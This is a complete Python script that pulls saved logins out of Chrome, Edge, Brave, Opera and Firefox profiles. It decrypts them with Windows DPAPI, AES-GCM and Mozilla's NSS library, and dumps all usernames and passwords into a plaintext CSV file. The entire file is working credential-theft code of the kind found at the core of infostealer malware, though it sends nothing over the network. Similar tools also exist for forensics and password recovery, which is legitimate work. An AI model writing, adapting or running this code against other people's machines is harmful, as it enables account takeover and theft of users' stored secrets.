import os
import sys
import json
import base64
import shutil
import sqlite3
import platform
import csv # Import csv module
import logging
import ctypes as ct
from configparser import ConfigParser
from glob import glob
from typing import Optional, Iterator, Any, List, Dict

# --- Windows Specific Imports ---
IS_WINDOWS = platform.system() == "Windows"
if IS_WINDOWS:
    try:
        import win32crypt
    except ImportError:
        print("ERROR: pywin32 library not found. Please install it: pip install pywin32")
        sys.exit(1)
else:
    # Define dummy win32crypt for non-Windows
    class win32crypt:
        @staticmethod
        def CryptUnprotectData(*args, **kwargs):
            raise NotImplementedError("DPAPI is only available on Windows")

# --- Cryptography Import ---
try:
    from Crypto.Cipher import AES
except ImportError:
    print("ERROR: pycryptodome library not found. Please install it: pip install pycryptodome")
    sys.exit(1)

# --- Basic Logging Setup ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
LOG = logging.getLogger(__name__)
logging.getLogger("configparser").setLevel(logging.WARNING)

# --- Constants ---
DEFAULT_ENCODING = "utf-8"
SYS64 = sys.maxsize > 2**32
PWStore = List[Dict[str, Optional[str]]]

# ==============================================================================
# Chromium Browser Decryption Logic
# ==============================================================================

def get_local_appdata_path() -> Optional[str]:
    """Gets the Local AppData path environment variable."""
    return os.environ.get('LOCALAPPDATA')

def get_appdata_path() -> Optional[str]:
    """Gets the Roaming AppData path environment variable."""
    return os.environ.get('APPDATA')

def decrypt_windows_dpapi(encrypted_blob: bytes) -> Optional[bytes]:
    """Decrypts data encrypted with Windows DPAPI. Returns raw bytes or None on failure."""
    if not IS_WINDOWS or not encrypted_blob:
        return None
    try:
        decrypted_bytes = win32crypt.CryptUnprotectData(encrypted_blob, None, None, None, 0)[1]
        return decrypted_bytes
    except Exception as e:
        LOG.debug(f"DPAPI Decryption failed: {e}")
        return None

def get_chromium_secret_key(browser_user_data_path: str) -> Optional[bytes]:
    """Gets the AES secret key from the Local State file for Chromium browsers."""
    local_state_path = os.path.join(browser_user_data_path, "Local State")
    secret_key = None
    if not os.path.exists(local_state_path):
        LOG.warning(f"Local State file not found at {local_state_path}")
        return None
    try:
        with open(local_state_path, "r", encoding=DEFAULT_ENCODING) as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key_b64:
            LOG.warning("Could not find 'os_crypt.encrypted_key' in Local State file.")
            return None
        encrypted_key_dpapi = base64.b64decode(encrypted_key_b64)
        if encrypted_key_dpapi.startswith(b'DPAPI'):
            encrypted_key_dpapi = encrypted_key_dpapi[5:]
        else:
             LOG.warning("Chromium key format unexpected (no DPAPI prefix).")
        secret_key = decrypt_windows_dpapi(encrypted_key_dpapi)
        if not secret_key:
             LOG.error("Failed to decrypt the master AES key using DPAPI.")
             return None
    except Exception as e:
        LOG.error(f"Failed to get Chromium secret key from {local_state_path}: {e}", exc_info=False)
        return None
    return secret_key

def decrypt_chromium_password(cipher_text: bytes, secret_key: bytes) -> Optional[str]:
    """Decrypts the Chromium password blob using AES GCM."""
    if not cipher_text or not secret_key:
        return None
    try:
        if not cipher_text.startswith(b'v10') and not cipher_text.startswith(b'v11'):
            return None # Not decryptable with this method
        nonce = cipher_text[3:15]
        encrypted_payload = cipher_text[15:]
        cipher = AES.new(secret_key, AES.MODE_GCM, nonce=nonce)
        ciphertext_proper = encrypted_payload[:-16]
        auth_tag = encrypted_payload[-16:]
        decrypted_pass_bytes = cipher.decrypt_and_verify(ciphertext_proper, auth_tag)
        decrypted_pass = decrypted_pass_bytes.decode(DEFAULT_ENCODING)
        return decrypted_pass
    except (ValueError, UnicodeDecodeError, Exception) as e:
        LOG.debug(f"Chromium password decryption/decoding failed: {e}")
        return None

def get_chromium_profiles(browser_user_data_path: str) -> List[str]:
    """Finds profile folders (Default, Profile *) with Login Data."""
    profiles = []
    if os.path.exists(os.path.join(browser_user_data_path, "Default", "Login Data")):
        profiles.append("Default")
    profile_pattern = os.path.join(browser_user_data_path, "Profile *")
    for profile_dir in glob(profile_pattern):
        if os.path.isdir(profile_dir) and os.path.exists(os.path.join(profile_dir, "Login Data")):
            profiles.append(os.path.basename(profile_dir))
    return profiles

def process_chromium_browser(browser_name: str, browser_user_data_path: str) -> PWStore:
    """Extracts passwords for a given Chromium browser and its profiles."""
    LOG.info(f"Processing Chromium browser: {browser_name}")
    results: PWStore = []
    if not os.path.exists(browser_user_data_path):
        LOG.warning(f"{browser_name} data path not found. Skipping.")
        return results
    secret_key = get_chromium_secret_key(browser_user_data_path)
    if not secret_key:
        LOG.error(f"Could not retrieve secret key for {browser_name}. Cannot decrypt passwords.")
        return results
    profiles = get_chromium_profiles(browser_user_data_path)
    if not profiles:
        LOG.warning(f"No profiles with Login Data found for {browser_name}.")
        return results
    LOG.info(f"Found profiles for {browser_name}: {', '.join(profiles)}")
    base_temp_dir = os.path.join(os.getcwd(), "Temp", "_".join(browser_name.split()))

    for profile in profiles:
        LOG.info(f"Processing profile: {profile}")
        source_login_data = os.path.join(browser_user_data_path, profile, "Login Data")
        profile_temp_dir = os.path.join(base_temp_dir, profile)
        temp_db_path = os.path.join(profile_temp_dir, "Login Data")
        if not os.path.exists(source_login_data):
            LOG.warning(f"Login Data file missing for profile '{profile}'. Skipping.")
            continue
        conn = None
        try:
            os.makedirs(profile_temp_dir, exist_ok=True)
            shutil.copy2(source_login_data, temp_db_path)
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()
            if not rows:
                LOG.info(f"No login entries found in database for profile '{profile}'.")
                continue
            LOG.info(f"Found {len(rows)} login entries in '{profile}'. Attempting decryption...")
            success_count = 0
            for url, username, cipher_text in rows:
                if not cipher_text or not username: continue
                decrypted_pass = decrypt_chromium_password(cipher_text, secret_key)
                if decrypted_pass is not None:
                    results.append({"username": username, "password": decrypted_pass})
                    success_count += 1
            LOG.info(f"Decryption for profile '{profile}': {success_count} succeeded.")
        except sqlite3.Error as e:
            LOG.error(f"SQLite error processing profile '{profile}': {e}")
        except Exception as e:
            LOG.error(f"Unexpected error processing profile '{profile}': {e}", exc_info=False)
        finally:
            if conn: conn.close()
    return results

# ==============================================================================
# Firefox Decryption Logic
# ==============================================================================

class NSSProxy:
    """Handles interaction with the Mozilla NSS library for decryption."""
    class SECItem(ct.Structure):
        _fields_ = [("type", ct.c_uint), ("data", ct.c_char_p), ("len", ct.c_uint)]
    class PK11SlotInfo(ct.Structure): pass

    def __init__(self):
        self.libnss: Optional[ct.CDLL] = None
        self._NSS_InitReadWrite = None
        self._NSS_Shutdown = None
        self._PK11_GetInternalKeySlot = None
        self._PK11_FreeSlot = None
        self._PK11_NeedLogin = None
        self._PK11SDR_Decrypt = None
        self._SECITEM_ZfreeItem = None
        self._PORT_GetError = None
        self._PR_ErrorToName = None
        self._PR_ErrorToString = None

    def _find_and_load_nss(self) -> bool:
        """Locates and loads the NSS library based on OS."""
        if self.libnss: return True
        locations: list[str] = []
        nssname = ""
        system = platform.system()
        if system == "Windows":
            nssname = "nss3.dll"
            prog_files_x86 = os.environ.get("ProgramFiles(x86)", "C:\\Program Files (x86)")
            prog_files = os.environ.get("ProgramFiles", "C:\\Program Files")
            local_appdata = get_local_appdata_path() or ""
            locations = ["", os.path.join(local_appdata, "Mozilla Firefox"), os.path.join(prog_files, "Mozilla Firefox"), os.path.join(prog_files_x86, "Mozilla Firefox"), os.path.join(local_appdata, "Mozilla Thunderbird"), os.path.join(prog_files, "Mozilla Thunderbird"), os.path.join(prog_files_x86, "Mozilla Thunderbird")]
        elif system == "Darwin":
            nssname = "libnss3.dylib"
            locations = ["", "/Applications/Firefox.app/Contents/MacOS", "/Applications/Thunderbird.app/Contents/MacOS", "/usr/local/opt/nss/lib", "/opt/homebrew/lib"]
        else: # Linux assumed
            nssname = "libnss3.so"
            locations = ["", "/usr/lib", "/usr/lib64", "/usr/lib/nss", "/usr/lib64/nss", "/usr/local/lib", "/usr/local/lib/nss"]

        LOG.debug(f"Searching for NSS library ({nssname})...")
        original_cwd = os.getcwd()
        for loc in locations:
            nsslib_path = os.path.join(loc, nssname) if loc else nssname
            if not os.path.isabs(nsslib_path) and loc == "": nsslib_path = shutil.which(nssname) or nsslib_path
            if not os.path.exists(nsslib_path): continue
            try:
                if system == "Windows" and loc:
                    try: os.chdir(loc)
                    except Exception: pass
                self.libnss = ct.CDLL(nsslib_path)
                LOG.info(f"Successfully loaded NSS library from: {nsslib_path}")
                self._setup_ctypes()
                return True
            except OSError as e: LOG.debug(f"Failed to load NSS from {nsslib_path}: {e}")
            finally:
                if system == "Windows" and loc: os.chdir(original_cwd)
        LOG.error(f"Could not find or load the NSS library ({nssname}). Firefox decryption unavailable.")
        return False

    def _setup_ctypes(self):
        """Sets up the ctypes function prototypes for loaded NSS library."""
        if not self.libnss: return
        SlotInfoPtr = ct.POINTER(self.PK11SlotInfo); SECItemPtr = ct.POINTER(self.SECItem)
        try: c_char_p_fromstr = NSSProxy.c_char_p_fromstr
        except AttributeError:
            class c_char_p_fromstr(ct.c_char_p):
                @classmethod
                def from_param(cls, value): return value.encode(DEFAULT_ENCODING) if isinstance(value, str) else value
            NSSProxy.c_char_p_fromstr = c_char_p_fromstr
        def set_proto(restype, name, *argtypes):
            try:
                func = getattr(self.libnss, name); func.argtypes = argtypes; func.restype = restype
                if restype == ct.c_char_p:
                    def decode_check(result, func, args): return result.decode(DEFAULT_ENCODING) if result else None
                    func.errcheck = decode_check
                setattr(self, f"_{name}", func)
            except AttributeError: LOG.warning(f"NSS function '{name}' not found."); setattr(self, f"_{name}", None)
        set_proto(ct.c_int, "NSS_InitReadWrite", c_char_p_fromstr)
        set_proto(ct.c_int, "NSS_Shutdown")
        set_proto(SlotInfoPtr, "PK11_GetInternalKeySlot")
        set_proto(None, "PK11_FreeSlot", SlotInfoPtr)
        set_proto(ct.c_int, "PK11_NeedLogin", SlotInfoPtr)
        set_proto(ct.c_int, "PK11SDR_Decrypt", SECItemPtr, SECItemPtr, ct.c_void_p)
        set_proto(None, "SECITEM_ZfreeItem", SECItemPtr, ct.c_int)
        set_proto(ct.c_int, "PORT_GetError")
        set_proto(ct.c_char_p, "PR_ErrorToName", ct.c_int)
        set_proto(ct.c_char_p, "PR_ErrorToString", ct.c_int, ct.c_uint32)

    def initialize(self, profile_path: str) -> bool:
        """Initializes NSS for a given profile path."""
        if not self.libnss and not self._find_and_load_nss(): return False
        if not self._NSS_InitReadWrite: return False
        nss_path = f"sql:{profile_path}"
        status = self._NSS_InitReadWrite(nss_path)
        if status != 0: self._handle_nss_error(f"NSS_InitReadWrite failed for profile {profile_path}"); return False
        return True

    def needs_auth_and_skip(self) -> bool:
        """Checks if authentication is needed; returns True if required (to skip)."""
        if not self._PK11_GetInternalKeySlot or not self._PK11_NeedLogin or not self._PK11_FreeSlot: return False
        keyslot = self._PK11_GetInternalKeySlot()
        if not keyslot: self._handle_nss_error("PK11_GetInternalKeySlot failed"); return False
        needs_login = False
        try:
            if self._PK11_NeedLogin(keyslot):
                LOG.warning("Profile requires Primary Password. Skipping decryption.")
                needs_login = True
        finally: self._PK11_FreeSlot(keyslot)
        return needs_login

    def decrypt(self, data64: str) -> Optional[str]:
        """Decrypts Base64 encoded data using NSS."""
        if not self._PK11SDR_Decrypt or not self._SECITEM_ZfreeItem: return None
        try: data_bytes = base64.b64decode(data64)
        except Exception: return None
        inp = self.SECItem(0, data_bytes, len(data_bytes)); out = self.SECItem(0, None, 0)
        decrypted_value = None
        try:
            status = self._PK11SDR_Decrypt(inp, out, None)
            if status == 0:
                decrypted_bytes = ct.string_at(out.data, out.len)
                try: decrypted_value = decrypted_bytes.decode(DEFAULT_ENCODING)
                except UnicodeDecodeError: decrypted_value = None
        finally:
            if out.data or out.len > 0: self._SECITEM_ZfreeItem(out, 0)
        return decrypted_value

    def shutdown(self):
        """Shuts down the NSS library."""
        if self.libnss and self._NSS_Shutdown:
            self._NSS_Shutdown()
        self.libnss = None

    def _handle_nss_error(self, context_message: str):
        """Logs details about the last NSS error."""
        if not self.libnss or not self._PORT_GetError or not self._PR_ErrorToName or not self._PR_ErrorToString:
            LOG.error(f"{context_message} (NSS error details unavailable)")
            return
        error_code = self._PORT_GetError()
        error_name = self._PR_ErrorToName(error_code) or "Unknown"
        error_string = self._PR_ErrorToString(error_code, 0) or "No description"
        LOG.error(f"{context_message} - NSS Error: {error_name} ({error_code}): {error_string}")

# --- Firefox Profile Handling ---
def find_firefox_base_path() -> Optional[str]:
    """Finds the base directory for Firefox profiles based on OS."""
    system = platform.system(); base_path = None
    if system == "Windows":
        app_data = get_appdata_path()
        if app_data: base_path = os.path.join(app_data, "Mozilla", "Firefox")
    elif system == "Darwin":
        home = os.path.expanduser("~"); base_path = os.path.join(home, "Library", "Application Support", "Firefox")
    else: home = os.path.expanduser("~"); base_path = os.path.join(home, ".mozilla", "firefox")
    if base_path and os.path.isdir(base_path): return base_path
    else: return None

def get_firefox_profiles(firefox_base_path: str) -> Dict[str, str]:
    """Parses profiles.ini and returns a dict of {ProfileName: AbsolutePath}."""
    profiles = {}; profiles_ini_path = os.path.join(firefox_base_path, "profiles.ini")
    if not os.path.exists(profiles_ini_path): return profiles
    config = ConfigParser(); config.read(profiles_ini_path, encoding=DEFAULT_ENCODING)
    for section in config.sections():
        if section.lower().startswith("profile"):
            try:
                path = config.get(section, "Path"); name = config.get(section, "Name", fallback=section)
                is_relative = config.getboolean(section, "IsRelative", fallback=True)
                profile_path = os.path.normpath(os.path.join(firefox_base_path, path) if is_relative else path)
                if os.path.isdir(profile_path): profiles[name] = profile_path
            except Exception as e: LOG.warning(f"Could not parse section '{section}': {e}")
    return profiles

def process_firefox() -> PWStore:
    """Finds and processes Firefox profiles for passwords."""
    LOG.info("Processing Firefox browser...")
    results: PWStore = []; nss_proxy = NSSProxy()
    firefox_base = find_firefox_base_path()
    if not firefox_base: LOG.warning("Firefox base path not found. Skipping."); return results
    profiles = get_firefox_profiles(firefox_base)
    if not profiles: LOG.warning("No valid Firefox profiles found. Skipping."); return results
    LOG.info(f"Found Firefox profiles: {', '.join(profiles.keys())}")

    for profile_name, profile_path in profiles.items():
        LOG.info(f"Processing Firefox profile: {profile_name}")
        if not nss_proxy.initialize(profile_path): continue
        if nss_proxy.needs_auth_and_skip(): nss_proxy.shutdown(); continue

        logins_json = os.path.join(profile_path, "logins.json"); signons_sqlite = os.path.join(profile_path, "signons.sqlite")
        credentials_data = []; source_file = None
        if os.path.exists(logins_json):
            source_file = logins_json
            try:
                with open(logins_json, 'r', encoding=DEFAULT_ENCODING) as f: data = json.load(f)
                for i in data.get("logins", []): credentials_data.append((i.get("hostname"), i.get("encryptedUsername"), i.get("encryptedPassword"), i.get("encType", 1)))
            except Exception as e: LOG.error(f"Failed to read/parse {logins_json}: {e}"); credentials_data = []
        elif os.path.exists(signons_sqlite):
            source_file = signons_sqlite; conn = None
            try:
                conn = sqlite3.connect(signons_sqlite); cursor = conn.cursor()
                cursor.execute("SELECT hostname, encryptedUsername, encryptedPassword, encType FROM moz_logins")
                credentials_data = cursor.fetchall()
            except sqlite3.Error as e: LOG.error(f"Failed to read {signons_sqlite}: {e}"); credentials_data = []
            finally:
                if conn: conn.close()
        else: LOG.warning(f"No credentials file found in profile '{profile_name}'."); nss_proxy.shutdown(); continue

        if not credentials_data: LOG.info(f"No login entries found in '{source_file}'."); nss_proxy.shutdown(); continue

        LOG.info(f"Found {len(credentials_data)} login entries in '{profile_name}'. Attempting decryption...")
        success_count = 0
        for url, enc_user, enc_pass, enctype in credentials_data:
            user = None; passw = None; decryption_failed = False
            if enctype == 1: # Needs decryption
                if enc_user: user = nss_proxy.decrypt(enc_user); decryption_failed = user is None
                if enc_pass and not decryption_failed: passw = nss_proxy.decrypt(enc_pass); decryption_failed = passw is None
            else: user = enc_user; passw = enc_pass # Plain text

            if not decryption_failed and user: # Store if successful and username exists
                results.append({"username": user, "password": passw})
                success_count += 1

        LOG.info(f"Decryption for profile '{profile_name}': {success_count} succeeded.")
        nss_proxy.shutdown()
        import time; time.sleep(0.1) # Small delay

    return results

# ==============================================================================
# Main Execution Logic
# ==============================================================================

def clean_up_temp():
    """Cleans up the Temp folder used for database copies."""
    temp_dir = os.path.join(os.getcwd(), "Temp")
    if os.path.exists(temp_dir):
        try: shutil.rmtree(temp_dir)
        except OSError as e: LOG.error(f"Error removing Temp directory {temp_dir}: {e}")

def write_credentials_csv(data: PWStore, filename: str):
    """Writes unique username,password pairs to a CSV file with headers."""
    if not data:
        LOG.info("No data to write to CSV file.")
        return

    output_dir = os.path.join(os.getcwd(), "output")
    os.makedirs(output_dir, exist_ok=True)
    filepath = os.path.join(output_dir, filename)

    LOG.info(f"Writing unique username/password pairs to CSV: {filepath}")
    written_count = 0
    unique_pairs = set() # Use a set to track unique (username, password) tuples

    try:
        with open(filepath, 'w', newline='', encoding='utf-8-sig') as csvfile:
            fieldnames = ['username', 'password']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)

            writer.writeheader() # Write the header row

            for entry in data:
                username = entry.get("username")
                password = entry.get("password")
                # Ensure both username and password exist before writing
                if username and password is not None:
                    pair = (username, password)
                    if pair not in unique_pairs: # Write only if not already written
                        writer.writerow({'username': username, 'password': password})
                        unique_pairs.add(pair)
                        written_count += 1

        LOG.info(f"Successfully wrote {written_count} unique pairs to {filepath}.")
    except Exception as e:
        LOG.error(f"Failed to write CSV file {filepath}: {e}")


def run_extraction():
    """Main function to orchestrate extraction from all supported browsers."""
    LOG.info("Starting Browser Password Extraction...")
    all_results: PWStore = []

    # Define Browsers and Paths
    local_appdata = get_local_appdata_path(); appdata = get_appdata_path()
    chromium_browsers = {}
    if local_appdata:
        chromium_browsers["Google Chrome"] = os.path.join(local_appdata, "Google", "Chrome", "User Data")
        chromium_browsers["Microsoft Edge"] = os.path.join(local_appdata, "Microsoft", "Edge", "User Data")
        chromium_browsers["Brave"] = os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data")
    if appdata:
        chromium_browsers["Opera"] = os.path.join(appdata, "Opera Software", "Opera Stable")
        chromium_browsers["Opera GX"] = os.path.join(appdata, "Opera Software", "Opera GX Stable")

    # Process Chromium Browsers
    for name, path in chromium_browsers.items():
        try:
            results = process_chromium_browser(name, path)
            if results: all_results.extend(results)
        except Exception as e: LOG.error(f"Critical error processing {name}: {e}", exc_info=True)

    # Process Firefox
    try:
        firefox_results = process_firefox()
        if firefox_results: all_results.extend(firefox_results)
    except Exception as e: LOG.error(f"Critical error processing Firefox: {e}", exc_info=True)

    # Write Combined Results (Unique Pairs to CSV)
    write_credentials_csv(all_results, "credentials_output.csv") # Changed function call and filename

    # Cleanup
    clean_up_temp()
    LOG.info("Browser Password Extraction Complete.")

if __name__ == "__main__":
    if not IS_WINDOWS:
        LOG.warning("Chromium decryption relies on Windows DPAPI.")
    try: run_extraction()
    except KeyboardInterrupt: LOG.info("Operation cancelled."); clean_up_temp(); sys.exit(1)
    except Exception as e: LOG.critical(f"Unexpected critical error: {e}", exc_info=True); clean_up_temp(); sys.exit(1)
    finally: pass
